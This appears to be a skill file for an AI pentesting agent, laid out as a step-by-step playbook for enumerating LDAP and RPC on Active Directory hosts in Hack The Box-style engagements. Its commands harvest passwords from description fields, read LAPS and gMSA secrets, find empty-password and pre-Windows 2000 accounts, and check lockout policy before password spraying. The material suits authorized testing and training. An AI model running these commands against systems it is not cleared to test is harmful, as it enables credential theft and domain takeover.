---
name: ldap
description: Enumerate LDAP/RPC (ports 389, 636, 3268, 3269, 135). Use when these ports are open. Covers anonymous bind, user/group enumeration, description field passwords, LAPS, Pre-Win2000 accounts, PASSWD_NOTREQD, PSO, domain trusts, rpcclient, ldapdomaindump.
user-invocable: false
allowed-tools: Read
---

# LDAP / RPC — Ports 389, 636, 3268, 135

## Step 1 — anonymous bind check
```bash
ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts        # get base DN
ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=*)' cn # anon bind works?
```
If anon bind works → enumerate users, descriptions, and groups without creds.

## Step 2 — user enumeration
```bash
# Without creds (anon bind)
ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' cn sAMAccountName description

# With creds
nxc ldap {IP} -u '{USER}' -p '{PASS}' --users
nxc ldap {IP} -u '{USER}' -H {NT_HASH} --users
nxc ldap {IP} -u '{USER}' -p '{PASS}' --groups
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(objectClass=user)' sAMAccountName description pwdLastSet badPwdCount userAccountControl
```

## Step 3 — description field (most common cred find on HTB)
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' -M get-desc-users
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(&(objectClass=user)(description=*))' sAMAccountName description
```
**Passwords in the description field is the single most common credential find in real pentests and HTB.**
Test every description string as a password for that user and all other users.

## Step 4 — full domain dump
```bash
ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap/
# Outputs HTML files: domain_users.html, domain_groups.html, domain_computers.html
# Open in browser — fastest way to see all users, descriptions, group memberships at once
```

## Step 5 — PASSWD_NOTREQD (empty password accounts)
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' sAMAccountName
```
Try logging in with empty password for any account returned.

## Step 6 — Pre-Windows 2000 compatible accounts
```bash
# Find accounts with TRUSTED_FOR_DELEGATION + old compatibility flag
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
nxc ldap {IP} -u '{USER}' -p '{PASS}' --trusted-for-delegation
```
**Password = lowercase hostname without the $ sign.**
```bash
# Example: computer account LEGACYPC$ → try password 'legacypc'
nxc ldap {IP} -u 'LEGACYPC$' -p 'legacypc' -k             # Kerberos auth
nxc smb {IP} -u 'LEGACYPC$' -p 'legacypc'
```

## Step 7 — AdminCount=1 (protected accounts)
```bash
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(adminCount=1)' sAMAccountName memberOf
nxc ldap {IP} -u '{USER}' -p '{PASS}' --admin-count
```
These accounts don't inherit ACL changes from parent OUs (AdminSDHolder protection).
ACL changes must be applied directly on the object.

## Step 8 — LAPS (local admin passwords stored in AD)
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' -M laps
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName
# New LAPS (Windows LAPS, 2023+)
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(msLAPS-Password=*)' msLAPS-Password sAMAccountName
```
LAPS password → local administrator on that specific computer.

## Step 9 — Fine-Grained Password Policies (PSO)
Check before ANY password spraying — service accounts often have lockout=0.
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol           # default domain policy
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' \
  -b 'CN=Password Settings Container,CN=System,DC=x,DC=x' \
  '(objectClass=msDS-PasswordSettings)' \
  msDS-LockoutThreshold msDS-PasswordSettingsPrecedence msDS-PSOAppliesTo msDS-MinimumPasswordLength
```
Service accounts in custom PSO often have `lockoutThreshold=0` → safe to spray aggressively.

## Step 10 — gMSA accounts
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' \
  '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-GroupMSAMembership
```
If you have ReadGMSAPassword right → retrieve the NT hash directly.
gMSA Kerberoasting always fails — 256-bit random password, never cracks.

## Step 11 — domain trusts
```bash
nxc ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' \
  -b 'CN=System,DC=x,DC=x' '(objectClass=trustedDomain)' name trustDirection trustType
```
Bidirectional trust = both domains exploitable. One-way: check which direction.

## Step 12 — RPC enumeration (port 135 / named pipes via 445)
```bash
rpcclient -U '' -N {IP} -c 'enumdomusers'                      # null session
rpcclient -U '' -N {IP} -c 'enumdomgroups'
rpcclient -U '' -N {IP} -c 'querydominfo'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomgroups'
rpcclient -U '{USER}%{PASS}' {IP} -c 'querydispinfo'           # all users with descriptions
rpcclient -U '{USER}%{PASS}' {IP} -c 'lsaenumsid'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumprivs'
```

## Step 13 — validate credentials (quick check)
```bash
nxc smb {IP} -u '{USER}' -p '{PASS}'                       # STATUS_LOGON_FAILURE = wrong creds
nxc ldap {IP} -u '{USER}' -p '{PASS}'                      # LDAP validation
nxc smb {IP} -u '{USER}' -H {NT_HASH}                      # hash validation
```

## Gotchas
- **Anon bind works** → also try RPC null session and SMB null in parallel
- **Description field** → check EVERY user; passwords are hidden there constantly
- **LAPS not deployed** → `ms-Mcs-AdmPwd` absent, but Windows LAPS (newer) uses different attribute
- **Pre-Win2000** → `userAccountControl:4194304` → try lowercase hostname as password
- **PSO lockout=0** → service accounts can be sprayed without risk; confirm before spraying domain accounts
- **gMSA** → never Kerberoast; check who has ReadGMSAPassword (BloodHound)
- **ldapdomaindump HTML** → fastest overview of the whole domain; open in browser after any full dump
- **Trusts** → SID filtering may be disabled on old trusts; check BloodHound domain trust analysis
